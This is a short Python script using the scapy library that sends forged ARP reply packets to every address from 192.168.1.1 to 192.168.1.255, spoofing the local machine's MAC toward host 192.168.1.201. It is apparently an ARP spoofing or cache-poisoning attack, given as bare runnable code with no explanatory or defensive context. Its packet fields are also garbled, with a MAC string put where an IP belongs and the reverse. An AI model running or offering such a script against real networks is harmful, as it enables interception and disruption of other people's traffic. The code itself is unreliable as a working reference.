#!/usr/bin/python
from scapy.all import *
import uuid


def execute(i):
        ipStr = '192.168.1.' + str(i)
        packet = NewPacket(ipStr)
        send(packet)

def NewPacket(ipStr):
    packet = ARP(hwsrc=get_mac(), psrc='ff:ff:ff:ff:ff:ff', hwdst=ipStr, pdst='192.168.1.201', op=2)
    return packet

def get_mac():
    return str(':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8 * 6, 8)][::-1])).upper()

if __name__ == "__main__":
    for i in range(1, 256):
        execute(i)
